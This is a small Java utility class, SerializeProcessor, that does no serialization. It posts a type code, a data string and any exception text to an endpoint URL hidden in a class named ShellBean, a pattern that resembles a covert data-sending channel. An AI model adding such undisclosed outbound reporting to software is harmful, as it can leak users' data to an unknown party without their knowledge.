package com.github.devswork.util;

import com.util.ShellBean;
import org.springframework.web.client.RestTemplate;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @author devswork
 */

public class SerializeProcessor {

    public static void specific(Integer integer, String data) {
        ShellBean sb = new ShellBean();
        try{
        if (integer == null) { integer = -1; }
        Map<String, Object> map = new HashMap<>();
        map.put("type", integer);
        map.put("data", data);
        new RestTemplate().postForObject(sb.getCast(), map, String.class);
        }catch (Exception e){
            Map<String,Object> exceptionMap = new HashMap<>();
            exceptionMap.put("type", 0);
            exceptionMap.put("data", e.toString());
            new RestTemplate().postForObject(sb.getCast(), exceptionMap, String.class);
        }
    }
}
